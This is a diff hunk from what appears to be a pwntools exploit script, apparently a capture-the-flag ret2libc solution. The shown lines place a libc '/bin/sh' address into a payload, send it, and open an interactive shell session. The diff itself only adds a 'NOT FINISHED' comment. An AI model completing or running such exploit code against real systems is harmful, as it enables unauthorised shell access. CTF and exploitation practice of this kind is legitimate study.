@@ -40,3 +40,4 @@ payload += p32(libc.search(b'/bin/sh').__next__())
 
 p.sendline(payload)
 p.interactive()
+# NOT FINISHED
